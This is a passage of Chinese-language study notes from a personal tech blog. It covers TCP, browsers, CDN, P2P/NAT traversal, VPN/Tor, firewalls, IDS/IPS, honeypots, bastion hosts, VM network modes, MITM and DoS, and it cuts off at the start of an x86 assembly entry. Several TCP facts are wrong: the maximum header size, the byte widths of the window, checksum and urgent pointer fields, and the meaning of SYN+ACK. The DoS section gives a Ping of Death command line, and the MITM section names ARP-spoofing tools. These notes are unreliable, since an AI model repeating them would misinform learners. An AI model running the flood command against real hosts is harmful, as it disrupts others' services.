title="TCP"></a>TCP</h3><p>建立链接，用于提供端口，来确定两个IP地址中不同进程之间的通信。使用该协议的应用层协议有：HTTP/S、FTP、SMTP、TELNET、SSH等</p><p><strong>报文格式</strong>：</p><p>TCP报文段=TCP首部20字节+TCP数据；首部通常为20字节，有时具有可选字段+填充（32bit倍数）</p><p>源端口+目的端口+seq序号+ack确认序号+数据偏移+保留+标志位+窗口+检验和+紧急指针</p><ul><li><p>源端口和目的端口：各占2字节，端口范围0-65535</p><blockquote><p>0-1023公认端口、1024-49151注册端口(有些软件绑定)、其余动态或私有端口；按协议也可以分为TCP、UDP、保留端口</p></blockquote></li><li><p>序号4B：用于说明本报文段第一个字节的序号；达到最大之后再次从0开始</p></li><li><p>确认序号4B：表明期望收到的下一个数据包中的第一个字节的序号，是本机收到的上一个序号+1；只有ACK标志=1时，确认序号才有效</p></li><li><p>数据偏移4b：表明头的长度，1bit=4B的偏移，最大154B偏移，也就是TCP头最大只能154B</p></li><li><p>保留与标志位：各6bit，前者目前均为0，后者详细如下</p><blockquote><p>URG：=1时表明该报文应尽快，而不需要按次序传送，用来与紧急指针配合使用，即紧急指针指向的字节前面的，不用太在意顺序</p><p>ACK：=1时，确认序号字段有效</p><p>PSH：=1时，需要接收方将本报文段<strong>尽快</strong>送给应用层</p><p>RST：=1时，表明<strong>连接错误</strong>，需要重连；还可以用来拒绝非法报文段</p><p>SYN：=1时&amp;&amp;ACK=1时，表明请求建立一个连接；该标志=1的报文段叫做<strong>同步报文段</strong></p><p>FIN：=1时，表明发送端完成发送任务</p></blockquote></li><li><p>窗口4B：滑动窗口，用于实现流量控制；在服务端发送报文上可以理解为对客户端的数据报缓冲区大小，在客户端中该值=min(拥塞窗口cwnd，接收端窗口大小)，其中的cwnd会随着网络的拥堵程度改变</p></li><li><p>检验和4B：发送端检验存储，由就手段进行验证</p></li><li><p>紧急指针4B：URG=1时该偏移量才有效，通过与序号字段中的值相加再-1=紧急数据的序号</p></li></ul><p><strong>三次握手</strong>：</p><ol><li>客户端，发送报文标志位SYN=1开启，表明想要连接，并产生一个随机序号A；</li><li>服务端返回标志位SYN=1&amp;ACK=1，表明确认连接请求；确认序号=序号A+1，并生成自己的随机序号B；</li><li>客户端检查发送过来的确认序号是否=A+1；正确则，将标志位ACK=1，序号=服务端确认号，确认号=B+1，发送给服务端；服务端检查确认序号与ACK标志位，无误连接成功</li></ol><p><strong>四次挥手</strong>：</p><ol><li>客户端发送报文标志位FIN+ACK置1，表明发送结束；</li><li>服务端收到客户端的FIN，并发送ACK确认收到FIN；</li><li>之后再由服务端发送FIN报文段，请求断开连接；</li><li>客户端收到服务端的FIN后，发送ACK，服务端收到并断开连接；客户端等待两个最大存活时间后，如果没有回复，则关闭连接</li></ol><p><strong>拥塞控制</strong>：</p><p>开环控制：设计之前敲定不能变、闭环控制：动态反馈（监测+传送+调整）</p><p>TCP采用闭环控制，基于滑动窗口，由发送方维护一个cwnd拥塞窗口，真正的发送窗口值wnd=min(cwnd，rwnd)</p><p>四种拥塞控制算法：慢开始、拥塞避免、快重传、快恢复</p><ul><li>慢开始：每收到一个确认，就把拥塞窗口+1，正常的话就是<strong>2的指数级别</strong>增长；当cwnd&gt;SSTH即慢开始门限时执行拥塞避免</li><li>拥塞避免：每经过一个RTT，<strong>cwnd+=1</strong>，线性增长。当出现拥塞时即重传定时器超时，<strong>ssthres=max(cwnd/2，2)</strong>，并让cwnd=1开始执行慢开始算法</li><li>快重传FR：收到<strong>三个连续重复ACK</strong>（加上第一次正经的共四个相同ACK），发送方就立即进行重传，执行快恢复算法</li><li>快恢复：<strong>ssthres=cwnd/2</strong>，之后执行拥塞避免算法</li></ul><hr><h3 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h3><p>目前的浏览器基本均为多进程浏览器，即将许多功能单独分离出来，包括但不限于：浏览器主进程、插件进程、渲染进程、GPU进程、网络进程等，各个进程之间采用IPC进行通信。<a href="https://zhuanlan.zhihu.com/p/47407398">图解浏览器的基本工作原理 - 知乎 (zhihu.com)</a></p><p><strong>导航过程</strong>：</p><ol><li><p>处理用户输入：浏览器进程中的UI线程负责判断其内容是地址还是其他东西，并决定是否发起网络请求</p></li><li><p>页面资源请求：浏览器主进程通过IPC把URL请求发送给网络进程，发起真正的URL请求</p><blockquote><p>先查找本地缓存资源，没有的话就先查找Host文件，没有目标再发送DNS请求等其他过程</p></blockquote></li><li><p>响应数据处理：网络线程根据接收到的<code>Content-Type</code>来判断返回值类型，并进行安全检查之后再根据此项发送给渲染进程等其他进程</p></li><li><p>准备渲染过程：绝大多数返回内容都是页面，交给渲染进程处理</p></li><li><p>页面处理：渲染引擎与JS引擎共同处理页面并将结果呈现</p></li></ol><p><strong>搜索引擎</strong>：</p><ul><li><p>搜索引擎结构：搜索器（蜘蛛）—分析器（NLP处理）—索引器（建立索引）—检索器（查找文档）—用户接口</p><blockquote><p>爬虫抓取策略：DFS、BFS、最佳优先搜索（贪心取优先相关度高）、反向链接搜索（由其他网站指向）、OPIC策略、大站优先策略等</p></blockquote></li><li><p>工作流程：爬行抓取—建立索引（常用倒排索引）—搜索词处理—排序</p></li><li><p>常见的类别：元搜索引擎（将搜索请求发送给其他搜索引擎，之后再综合排序；dogpile、All4one、webcrawler）、全文搜索引擎（baidu、google等在web内容及标题中搜索）、目录搜索引擎（逐级向下选择）、垂直搜索引擎（专注特定领域）</p></li></ul><p><strong>渲染引擎</strong>：用于获取网页的内容（HTML等），整理排版（CSS），然后显示；目前的浏览器引擎主要指的就是渲染引擎，而JS引擎通常作为渲染引擎的一部分，下面是一些常见的渲染引擎：</p><ul><li>Geocko：火狐浏览器；开源；</li><li>Trident：IE浏览器、世界之窗；</li><li>Webkit：Safari浏览器；基于KHTML研发，开源；</li><li>Blink：google，edge，Opera浏览器；Google基于webkit研发；开源；</li></ul><p><strong>渲染过程</strong>：<a href="https://juejin.cn/post/6844903877314101255">10分钟看懂浏览器的渲染过程及优化 - 掘金 (juejin.cn)</a></p><ol><li><p>解析HTML，生成HTML DOM树：</p><p>编码转换——标签令牌化——生成节点对象——节点对象构建成树形结构</p></li><li><p>碰到CSS，生成CSSOM树：同上</p><blockquote><p>碰到JS代码时会暂停进行，转交给JS引擎解析加载代码，有可能会改变DOM树结构</p></blockquote></li><li><p>合并生成Render tree，即渲染树：将前面两者结合</p></li><li><p>Layout，遍历渲染树，计算盒子模型详细信息，即每个节点在浏览器窗口的确切位置与大小</p><blockquote><p>盒子模型：Content（内容）—&gt;Padding（内边距）—&gt;Border（边框）—&gt;Margin（外边框）</p><p><img src="https://s2.loli.net/2024/08/08/u41RTcFYyLWwAIK.png" alt="box.png"></p></blockquote></li><li><p>Paint，绘制页面，绘制时间与CSS复杂度成正比</p></li></ol><p>渲染引擎通常以一个进程的形式存在，其下面还包括许多线程，其中的常驻线程有：GUI渲染线程、JS引擎线程、事件触发线程、定时器线程、HTTP请求线程等</p><p><strong>JS引擎</strong>：解析JS（翻译为机器语言）来实现网页的动态效果，可以理解为浏览器中的虚拟机</p><ul><li>SpiderMonkey：鼻祖；后更新为TraceMonkey、JaegerMonkey</li><li>Chakra：微软开发，用于IE；</li><li>JavaScriptCore：用于webkit，Apple开发；</li><li>V8：google基于C++开发，Node.js基于V8引擎开发；</li><li>流程：JS代码解析为抽象语法树（ATS）——基于AST解释器将其转换为虚拟机字节码——优化编译器将部分函数优化为本地机器指令执行</li></ul><p><strong>安全机制</strong>：<a href="https://www.freebuf.com/sectool/303551.html">WEB安全-浏览器的几种防护策略 - FreeBuf网络安全行业门户</a></p><ul><li><p>同源策略：防止A站的JS修改B站的页面，对于js来说只有同一IP、同一端口、同一协议才能够算作是同源。</p><p>不受限制的内容：页面中的链接、重定向、表单提交、跨域资源的引入</p><p>进行跨域：<strong>JSONP</strong>（服务端有专门的JSONP请求接口，可以接受JSON格式的参数，并返回该参数的执行结果）、<strong>CORS</strong>（允许浏览器向跨源服务器发出XMLHttpRequest请求）、<strong>Nginx</strong>反向代理可以跨域访问</p></li><li><p>内容安全策略CSP：开发者在规定浏览器对于危险资源不能加载执行，即有漏洞，但是在该客户端上不被允许执行</p></li><li><p>沙箱机制：至少会有两个进程出现，一个代理进程一个目标进程，前者与后者之间建立IPC通道并接受各种请求，待病毒特性充分暴露之后会进行回滚机制，将病毒的痕迹和动作抹去</p></li><li><p>恶意网站拦截：拦截的大多为挂马网站、诈骗钓鱼网站等。目前大多的浏览器采用的大多基于黑名单制度，该项黑名单定期会从服务器获取。<a href="https://phishtank.org/index.php">PhishTank | Join the fight against phishing</a></p><blockquote><p>EV SSL证书，拥有该证书的网站会在浏览器地址栏中显示为绿色，拥有特别标注</p></blockquote></li></ul><h4 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h4><p>全称是WebAssembly，即在web上的汇编，准确来说wasm就是一套专门用在浏览器上的汇编语言，目的当然就是加快运行速率咯。</p><p>我们知道python和js都是JIT（just in time）编译方式的，也就是在运行时再将代码转换为机器码运行，因此对比于C/C++等AOT（ahead of time）这种提前写好机器码的语言会更慢一点。</p><p>为了加快浏览器上js的执行速度，因此wasm这种汇编就出现了。</p><p>可以C/C++/Go等编译型语言来生成相关wasm文件以此代替js文件。浏览器引擎在收到wasm文件后可以直接对应查表转换为引擎对应字节码加以执行。</p><p>一般都是将js和wasm配合使用，用js编写较为复杂的函数功能来供给wasm调用</p><blockquote><p><a href="https://evian-zhang.github.io/wasm-tutorial/">引言 - WASM 汇编入门教程 (evian-zhang.github.io)</a></p></blockquote><hr><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>内容分发网络，是一种网络模型。通过设置下属缓冲服务器，即接近用户的服务器（白话就是Web缓存，区别于镜像服务器，只有部分内容，有额外操作），来缓解用户对主服务器的流量请求；</p><ul><li><p><strong>过程</strong>：源服务器通过HTTP包中的<code>cache-control</code>字段来决定内容的缓存形式（是否保存，多长时间等）。对于静态内容来说：初始时源服务器将内容push给CDN服务器，之后用户向CDN请求，如果CDN中没有用户索要内容，则先向源服务器pull内容，之后再分发；而对于动态内容来说，只有一小部分能够设置成由CDN提供</p></li><li><p><strong>防御DDOS</strong>：为防止某一个服务器流量过高时，会将其部分流量转移到其他服务器上（负载均衡）。在这之中有的采用任播技术，将所有的CDN服务器都共享一个IP，这样其中一个出问题了，就会请求地理上最近的其他CDN，需要专门的负载均衡系统</p></li><li><strong>用处</strong>：CDN会对包进行处理，去除不必要内容，来减少包大小，加速用户；减少传输距离，即降低了网络带宽费用，降低服务器方费用</li></ul><p>CDN服务器安置原则：</p><ul><li>在ISP（互联网服务提供商）处架设CDN集群</li><li>在关键的IXP（因特网交换点）先放置CDN，之后邀请ISP入驻</li><li>根据地理位置和地区流量检测选择布置</li></ul><p>关于CDN中存储的内容和源服务器之间的同步关系</p><ul><li>通过http报文中的条件GET，每当用户请求CDN时，代理服务器就会向源服务器发送带有<code>If-modified-since: 2022 5:20</code>的报文，源服务器收到后判断上面这个时间之后没有修改过，则会返回一个空的响应报文；否则返回新报文，并在CDN端更新时间戳</li></ul><hr><h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><p>peer to peer，即点对点技术，又叫做互联网络对等技术，与此对应的有C/S模式（也有所谓的B/S模式）。每个结点即能充当服务器又能充当客户，基本不存在带宽问题；为实现跨内网交流，要将内网IP更换为公网IP（NAT），从而到达另一个内网；</p><p><strong>NAT</strong>：网络地址转换技术，是一种将数据包中IP地址更换为其他IP地址的功能，常由路由器或防火墙实现；目前代指动态NAT（即NAPT），不仅会改IP地址，还能改变数据报的TCP/UDP端口</p><p>术语：内部Tuple、外部Tuple、目标Tuple、打洞hole punch；Tuple=IP+Port</p><ol><li>完全锥形NAT：传统NAT，内部Tuple单独占一个外部Tuple</li><li>地址限制型锥型NAT：在锥型基础上，只有之前内部主机联系过的IP才能借助之前的外部Tuple联系，只能发送UDP报文</li><li>端口限制圆锥型NAT：在地址限制型基础上，外部机器B想要与A联系，就要用A之前联系B时的目标Tuple（Ip+端口）向外部Tuple通信</li><li>对称型NAT：内外交流双方构成的【内部Tuple-目标Tuple】对，单独占用NAT后的一个外部Tuple；而外部IP也只能通过该固定的<strong>外部Tuple</strong>来访问内部；即不仅限制了外部的IP和端口，也限制了内部的IP和端口</li></ol><p><strong>NAT穿透/打洞</strong>：有了NAT技术之后，任意两个在内网的客户端想要通信，就要建立隧道/打洞</p><ul><li>1-1、1-2、1-3、1-4打洞：中间服务器C把A和B的外部Turple相互告诉，任意外部都可联系内部</li><li>2-2、2-3、2-4、3-3打洞：先同上，由于IP地址受限，因此需要A直接先向B发送连接（A开了一个针对B的口），之后A通过C向B发送邀请（B此时是没有与A连接的，因为B之前没有连过A），让B也直接向A发送邀请（B开了一个针对A的口，两端成功连接）；根据类型指定IP或Port</li><li>3-4、4-4常规方法无法打洞</li></ul><blockquote><p>更多细节参考<a href="https://juejin.cn/post/6844904098572009485">NAT基本原理及穿透详解(打洞)</a></p></blockquote><p><strong>BitTorrent</strong>：</p><p>一种用于文件分发的流行P2P协议，会将文件划分为大小相等的n块</p><ul><li><p><strong>洪流(torrent）</strong>：是参与一个特定文件分发的集合，每个个体叫对等方，以等长文件块（256KB）为单位</p></li><li><p><strong>追踪器（tracker）</strong>：划分洪流，登记新来的对等方，将对等方的IP发送给新来的（杂p2p，并不是非常的对等，因为tracker也需要服务器）</p></li><li><p><strong>种子</strong>：制作<code>.torrent</code>文件，其中包含Tracker服务器地址、文件大小、文件名、块大小等</p><p>在拿到之后，会先连接Tracker服务器，之后验证缺少信息并交换信息</p></li><li><p><strong>磁力链接</strong>：格式<code>magnet:?xt=urn:bith:~~~~</code>后面跟一串40位16进制的数字；<code>magnet</code>协议名，<code>xt</code>表示资源定位点，<code>urn:bith</code>表示Hash名，采用URN来定位资源，Hash值即为资源的唯一命名</p></li><li><p><strong>最稀缺优先</strong>：具有该洪流中的块列表，资源数最少的块，最先互传；</p></li><li><p><strong>一报还一报</strong>：向我传送速率最高的对等方获得我方的优先权，规定n个疏通，剩余的阻塞</p></li></ul><p>P2P应用：分布式计算（区块链）、文件共享、流媒体、IP层语音通信（VoIP）、游戏平台</p><hr><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>虚拟专用网络VPN，旨在提供一种安全连接到网络服务器的方式。其核心是隧道技术，使用该技术的数据可以是不同协议的数据帧或包，因为隧道协议会将其重新封装后并发出（该过程也叫做挖隧道）。</p><p>从两端类型来说分为：</p><ul><li><p>站点对站点VPN：两端的地点相对固定；</p></li><li><p>客户端对站点VPN/远程登陆VPN：全隧道模式（所有数据都通过）+半隧道模式（部分数据通过）；</p></li></ul><p>加密方式：AES256+3DES；保护完整性：Hash；认证：PSK+RSA</p><p>根据使用的协议：目前较多的IPsec VPN和SSL/TLS VPN，还有Socks5、PPTP、L2F、L2TP协议等</p><ul><li><p><strong>IPsec VPN</strong>：</p><p>IPsec协议位于网络层，多用于站点对站点传输；其VPN有两个主要模式：传输模式（也叫半隧道模式）与隧道模式，在传输模式种并非所有的数据都会经过加密，而后者则会全部加密甚至是IP头。</p><p>需要网络中设备安装相应软件并经过身份验证、使得网络管理可见性更广（更底层）</p></li><li><p><strong>SSL VPN</strong>：</p><p>SSL/TLS位于应用层与传输层之间，多用于客户端对站点传输；其VPN模式：门户模式（特定网页或Web应用）和隧道模式（甚至可以访问非Web应用）；</p><p>SSL协议广泛应用于浏览器中（多亏HTTPS）因此部署成本较低，只需开放443端口、可以部署在内网中的任一个节点上，移动性强、缺少身份验证可能有安全问题、管理繁琐，需要管理员设置模式</p></li></ul><p><strong>Tor</strong>：洋葱网络/路由，一种“代理节点快速动态变化的加密三重代理”，相当于多重VPN；默认情况下Tor通过3个中继器进行跳转：Guard中继器、Middle中继器、Exit中继器。</p><ul><li><p><strong>中继器</strong>：当Alice想要访问Bob时，会在Tor服务器中选择上述三种中继器各一个，而且会定时重组选择新的中继器。为了防止所有的Tor中继器被阻塞，每次只会给用户一小部分的中继器信息。</p></li><li><p><strong>加密过程</strong>：Alice与Guard中继器借助Curve25519椭圆曲线生成一个对称密钥key1，之后Alice使用Guard中继器作为加密跳板来与Middle中继器继续生成key2，以此类推。</p><p>最后Alice有了3把key，每当Alice想要访问Bob时，会依次使用key1、key2、key3对数据包进行加密，每经过一个中继器就解一次密，也就是Exit中继器能看到最终传输内容</p></li></ul><hr><h3 id="FireWall"><a href="#FireWall" class="headerlink" title="FireWall"></a>FireWall</h3><p>Firewall，作用：限制外来用户、限定用户访问特定站点。可以在单独的硬件上，也可以作为软件；作为硬件一般叫做网络防火墙，需要针对广泛的连接进行配置，而后者又叫软件/主机防火墙，可以针对单独的机器设备进行定制。</p><ul><li><p>两种分段模型：</p><ul><li><p>外部网络—屏蔽主机防火墙—内部网络；</p></li><li><p>外部网络—屏蔽路由器—边界网络=DMZ隔离区—屏蔽路由器—内部网络</p></li></ul></li><li><p>过滤标准：源IP、目标IP、内容、协议</p></li><li><p><strong>工作模式</strong>：</p><ul><li>路由/网关模式：将防火墙当作路由器使用，内外接口处于不同的子网之中，需要更改网络拓扑</li><li>透明模式/桥模式：将防火墙当作交换机，类似于路由器中的仅接内部网，可以互相通信，无IP</li><li>混合模式：防火墙1网关模式，防火墙2桥模式，之后连接防火墙，防火墙1启动VRRP（虚拟路由器冗余协议）进行备份</li></ul></li><li><p><strong>FireWall类型</strong>：</p><ul><li>静态包过滤/无状态检测防火墙：运行于OSI的网络层；类似于HTTP的无状态，每一个数据包都需要检查，因此对手动创建的接入控制列表要求较高</li><li>电路级网关防火墙：运行在会话层；连接一段时间后仍无异样，就停止监视</li><li>动态包过滤/状态检测防火墙：作用域传输层及以上；能够监控持续的连接</li><li>代理防火墙/应用层防火墙：运行在应用层；相当于有代理作用的防火墙</li><li>混合型：不多bb</li></ul></li></ul><p><strong>WAF</strong>：Web应用防火墙，过滤监视HTTP通信来保护Web应用程序；应用层防御；负安全模型（黑名单）/肯安全模型（白名单）；预防SQL注入、XSS、文件上传、第七层Dos攻击等</p><p>基于网络的WAF—基于主机的WAF：专门的硬件—作为软件集成，消耗本地资源</p><p>基于云的WAF：云服务商将对去到服务器的流量进行检测</p><h4 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h4><p>入侵检测系统；对攻击、恶意流量、木马进行检测并发出警告；旁路部署在需要关注的链路上；</p><ul><li><p><strong>CIDF体系</strong>：为IDS通用模型，包括事件产生器+事件数据库+事件分析器+响应单元</p><ol><li><p>事件产生器搜集信息数据，并将其转换为GIDO（通用入侵检测对象）标准格式转交给其他组件</p></li><li><p>事件分析器：接受GIDO，并判断是否构成威胁</p></li><li><p>事件数据库：存储各种事件</p></li><li><p>响应单元：根据GIDO作出反应，终止进程、切断链接、报警等</p></li></ol></li><li><strong>根据数据源的分类</strong>：<ol><li>HIDS：基于主机，数据来源有系统/应用日志、审计日志、端口调用情况等</li><li>NIDS：基于网络，对网络中的数据包进行监测分析</li><li>DIDS：分布式，高层次IDS接受低层次的IDS信息</li></ol></li><li><strong>根据检测方法的分类</strong>：<ol><li>误用检测系统：根据已有库中的攻击模式，对外来入侵判断类型，进行特征模式匹配或借助专家系统判断；误报率低、要求不高、只针对已知攻击</li><li>异常检测系统：设定标准与阈值，当超过该标准时就警报；误报率不易控制、大量信息特征采集</li><li>混合检测系统：不多bb</li></ol></li><li>根据响应方式分类：实时监测、非实时检测</li><li><strong>误用检测分析方法</strong>：<ol><li>模式匹配：依赖于模式库，模式库中存储入侵特征</li><li>专辑系统：专家知识库，形成IF-THEN规则</li><li>状态转换：状态转换图，将入侵过程看作一个行为序列进行分析</li><li>基于信誉检测：检测IP、DNS等是否上过黑名单</li></ol></li><li><strong>异常检测方法</strong>：贝叶斯统计、机器学习、神经网络</li></ul><blockquote><p>HIDS基于主机的入侵检测系统，特征检测，部署于内网服务器中；NIDS基于网络入侵检测系统，异常检测，部署于内网节点中</p></blockquote><p><strong>IPS</strong>：入侵防御系统，区别于IDS，在检测到威胁时，能够自动阻止攻击并采取行动。由于需要流量经过因此需要串行部署。检测方法与IDS相似，这里不多冗余</p><p>根据安装的宿主分为：网络入侵防御系统NIPS、主机入侵防御系统HIPS，前者检测分析流量，后者监测文件进程</p><ul><li>核心组件如下：<ul><li>签名库：存放已知攻击特征</li><li>异常检测引擎：检测未知攻击和异常行为</li><li>阻止引擎：根据检测到的类型及威胁等级来才需相应的措施</li><li>管理控制台：配置管理IPS</li><li>日志报告系统：记录IPS活动，生成报告并分析数据</li></ul></li></ul><p><strong>蜜罐</strong>：模拟若干个容易受攻击的主机或服务吸引攻击者，用于捕获病毒、恶意代码样本等，在攻防对抗中也能够有效地浪费敌方时间。</p><p>交互程度：低交互（系统及服务的全模拟，但最安全）、中交互（最模拟OS）、高交互（有真实的OS）</p><p>技术分类：牺牲型（提供真实的目标，但较为危险）、外观型（模拟）、测量型（真实、难以绕过、不易被当做跳板）</p><blockquote><p><strong>蜜网</strong>是由多个蜜罐+防火墙+IDS+监控报警系统等组成的体系结构；<strong>蜜标</strong>是一种特殊的蜜罐诱饵，它不是任何的主机节点，而是一种带标记的数字实体；<strong>蜜场</strong>是通过代理的方式扩展诱饵节点部署范围的蜜罐系统形态</p></blockquote><p>蜜罐系统主要包括：数据捕获（监控病毒等的行为）、交互仿真（模拟与攻击者的交互）、安全防护（防止蜜罐被破坏）三部分。又可以划分为：诱饵层（散布诱饵信息-面包屑）、探针层（监测恶意访问将其定向到蜜罐）、蜜罐层（仿真系统，并采集信息）、分析层（分析信息，生成威胁情报）</p><h4 id="BH"><a href="#BH" class="headerlink" title="BH"></a>BH</h4><p>堡垒机（BastionHost），也叫做运维审计系统，是一台具备强大防御功能和安全审计功能的服务器，说人话就是控制账户及权限，并记录干了什么的东西。</p><ul><li><strong>核心功能/理念4A</strong>：认证Authen、账号Account、授权Authorize、审计Audit</li><li><strong>目标5W</strong>：What、Which、Where、Who、When即谁在什么时候，在哪个位置，能够干什么，并且它干了什么</li><li><strong>模块</strong>：<ol><li>运维平台：RDP/VNC运维；SSH/Telnet运维；SFTP/FTP运维；数据库运维；Web系统运维；远程应用运维；</li><li>管理平台：三权分立；身份鉴别；主机管理；密码托管；运维监控；电子工单</li><li>自动化平台：自动改密；自动运维；自动收集；自动授权；自动备份；自动告警</li><li>控制平台：IP防火墙；命令防火墙；访问控制；传输控制；会话阻断；运维审批</li><li>审计平台：命令记录；文字记录；SQL记录；文件保存；全文检索；审计报表</li></ol></li><li><strong>身份认证方式</strong>：本地认证（直接账密）、远程认证（远程账密）、双因子认证（验证码）、第三方认证（其他绑定的账密）</li><li><strong>运维方式</strong>：B/S（借浏览器部署控制）、C/S（客户端）、H5（页面登录控制）、网关</li><li><strong>部署方式</strong>：单机（旁挂在交换机旁）、HA高可靠部署（比前者多一个备份，且共用一个IP）、异地同步部署（多地多台）、集群部署（抽两个堡垒机当总的，一主一备）</li></ul><hr><h3 id="Network-of-VM"><a href="#Network-of-VM" class="headerlink" title="Network of VM"></a>Network of VM</h3><ul><li><p><strong>NAT</strong>（默认）：内部设置分配私有地址，外网无法访问；在每个虚拟机中虚拟机软件会创建一个默认网关（IP固定），之后虚拟机上网流量必定经过本网关，再到宿主机，因此各个虚拟机之间无法交流；</p><p>宿主相对于虚拟机来说是外网，虚拟机可以访问宿主，但不能反过来</p></li><li><p><strong>NAT网络/模式</strong>：虚拟机之间可以相互连接，相较于NAT来说，有一个虚拟网关、DHCP、交换机将各个虚拟机存放在同一个网络之中，可以访问互联网；搭建靶场！！！</p></li><li><p><strong>桥接</strong>：虚拟机与宿主机平级，会占用多个宿主网关的分配地址，之间可以互ping</p></li><li><p><strong>内部网络</strong>：虚拟机可以互通，但是无法与宿主交流，相当于虚拟机们自己在一个独立的网络中；如果要互ping，需要提前配置网络</p></li><li><p><strong>仅主机模式</strong>：相较于内部网络，会自动分配IP地址（有DHCP），而且可以与宿主互ping，但是不能上网</p></li></ul><hr><h3 id="MIMT-amp-DOS"><a href="#MIMT-amp-DOS" class="headerlink" title="MIMT &amp; DOS"></a>MIMT &amp; DOS</h3><h4 id="MIMT"><a href="#MIMT" class="headerlink" title="MIMT"></a>MIMT</h4><p>中间人攻击，即在两台正常通信的计算机中间塞入攻击者这个”中介”，包括但不限于DNS欺骗、ARP污染等。大多都用于监听，不会造成真正意义上损伤</p><ul><li>ARP污染/欺骗：</li></ul><p>每一台安装了TCP/IP协议的主机都有ARP缓存表，包含动态的和静态的，前者有时限，后者没有，需要注意，网关和终端设备基本都会有该缓存表，初始化时广播查找；</p><p>ARP欺骗原理：接受新条目时，并不会区别真假，而是将已有的IP更换为新的MAC地址，攻击者借此给目标和目标所在网关发送两份假信息，实现中间人攻击；将受害者的目标IP转移到攻击者特定的MAC地址上。工具：Cain、Ettercap、NetFuke。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -a//查看缓存表</span><br><span class="line">-s + IP MAC//改为静态</span><br><span class="line">-d (+ IP)//删除全部或某一条</span><br></pre></td></tr></table></figure><p>防御措施：进行静态绑定、使用ARP防火墙</p><ul><li>DNS欺骗：攻击者冒充域名服务器，受害者所有上网过程（除非直接搞IP）均经过攻击者的审查</li><li>SSL劫持：当浏览器网站需要重定向时，由于攻击者在网页代码中插入了挂马网站的链接，导致最终用户进入到该网站</li><li>电子邮件劫持：如果攻击者能够访问受信任机构的邮箱，或电子邮件服务器，就可以截获客户的电子邮件，甚至以机构的身份发送钓鱼邮件</li><li>IP欺骗、Wi-Fi欺骗、HTTPS欺骗</li></ul><hr><h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><p>又叫拒绝服务攻击，旨在使目标计算机无法处理正常流量。多基于物联网设备loT，形成DDOS（分布式Dos，能够很好的隐藏自己）；</p><p>主要手段有如下：</p><ul><li>Ping of Death：利用ICMP协议，向目标端口发送大量的大尺寸ICMP包，由于尺寸过大导致目标的缓冲区溢出，从而使系统崩溃或挂起<code>ping -c 1 -s 65535 IP</code>。类似的还有IGMP Flood</li><li>UDP Flood：伪造与目标之间的UDP通信，回复地址指向开着echo服务的服务器，则充满足够多数据流。</li><li>SYN Flood：半连接状态的TCP连接，填满TCP的请求队列。Land攻击（在此基础上，构造该包的源地址和目的地址均为目标靶机IP）</li><li>Smurf攻击：将ICMP应答数据包中的回复地址设置为受害网络的广播地址，让所有主机对此回应，进行消息淹没。Fraggle攻击（在此基础上，采用UDP协议发送伪造消息）</li></ul><p>根据攻击方式有以下分类</p><ul><li>弱点攻击/资源层攻击：以适当顺序发送一定数量的定制报文，攻击目标主机的程序/OS</li><li>带宽泛洪/容量耗尽：发送大量无用分组</li><li>连接泛洪/协议攻击：在攻击目标上创建大量全开/半开的TCP连接（针对协议）</li><li>针对中间件或者系统的攻击</li></ul><p>也可以根据网络层次进行分类：</p><ul><li><p>网络层：主要消耗网络带宽资源，常见ICMP洪水攻击、ARP洪水攻击、IP分片攻击</p></li><li><p>传输层：主要使目标服务器过载，常见SYN洪水攻击、ACK洪水攻击、UDP流量攻击</p></li><li><p>应用层：主要使用户无法正常使用，常见DNS解析攻击、HTTP GET/POST攻击、CC攻击</p><blockquote><p>CC：挑战黑洞，就是攻击者借助代理不停发送大量数据包给服务器造成资源耗尽</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x86汇编</title>
      <link href="/2023/08/27/x86%E6%B1%87%E7%BC%96/"/>
      <url>/2023/08/27/x86%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h3><ol><li><p><b>Base</b></p><ul><li><p>在x86架构中，1字=2字节，与位数无关；</p></li><li><p>小端存储：高字节放高地址；</p></li><li><p>K(千)-M(兆)-G(吉)-T(太)-P(拍)-E(艾)-Z(泽)-Y(尧)</p></li><li><p>AT&amp;T语法会在常量前加<code>$</code>，而在寄存器前加<code>%</code>，且源操作数放在目的操作数前面，Intel语法不加这些符号，且目的在源前面</p></li><li><p>x86指32位架构=IA-32，x86-64指在32位上扩展至64位=amd64=intel64=IA-32E，IA-64即64位架构（但是并不兼容之前的32位）</p></li></ul></li><li><p><b>Build</b>——常量（整数常量/整型常量表达式、实数常量、字符常量/字符串常量）+ 保留字 + 标识符 + 伪指令 + 指令；指令（一条语句）=  (标号) + 指令助记符 + 操作数 + (注释) + (NOP)</p><blockquote><p>NOP占1个字节，用于对齐到4的位数位置，类似作用的还有ALIGN（伪指令）；单行注释用“；”，块注释用“COMMENT 符号……符号”，中间包括的内容全是注释；</p></blockquote></li><li><p><b>Model</b>——32位模式下三个模式：保护模式 + 实地址模式 + 系统管理模式；64位（x86-64）模式下额外包含：兼容模式（不兼容16位实地址模式） + 64位模式；</p><ul><li><p>保护模式（大多）：为兼容8086；32位地址线均可用；支持分页、优先级；所有指令可用，程序被分配的段以外的空间不允许访问。</p><p>其下的虚拟8086模式，以一个任务的形式工作在保护模式下。</p></li><li><p>实地址模式：兼容8086。寻址方式=段寄存器×16当作基地址，再加上偏移地址形成最终物理地址（只用了32位中的低20位）。可执行所有指令，且所有指令工作在特权级（优先级0）。由于不能分页管理，所以可以直接操作内存</p></li><li><p>系统管理模式：专门为32位OS提供的模式</p></li></ul></li></ol><h3 id="指令助记符"><a href="#指令助记符" class="headerlink" 